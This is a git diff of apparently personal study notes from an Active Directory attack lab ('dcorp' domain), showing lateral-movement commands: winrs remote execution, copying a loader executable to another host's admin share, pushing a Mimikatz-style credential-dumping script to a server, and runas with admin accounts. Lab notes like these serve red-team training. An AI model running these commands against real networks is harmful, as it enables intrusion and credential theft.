@@ -21,12 +21,7 @@ winrs -r:dcorp-mgmt cmd /c "set computername && set username"
 $null | winrs -r:dcorp-mgmt "powershell /c Get-Process -IncludeUserName"
 ```
 
-### Lateral 1
-Review AppLocker settings
-```powershell
-Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-```
-
+### Lateral 1 (Admin)
 Add port forward to machine to forwards to webserver - downloading executable is bad
 ```powershell
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
@@ -68,5 +63,5 @@ Copy-Item C:\AD\Tools\Invoke-MimiEx-vault.ps1 \\dcorp-adminsrv.dollarcorp.moneyc
 
 Use `runas` to open cmd 
 ```powershell
-runas /user:dcorp\svcadmin /netonly cmd
+runas /user:dcorp\srvadmin /netonly cmd
 ```
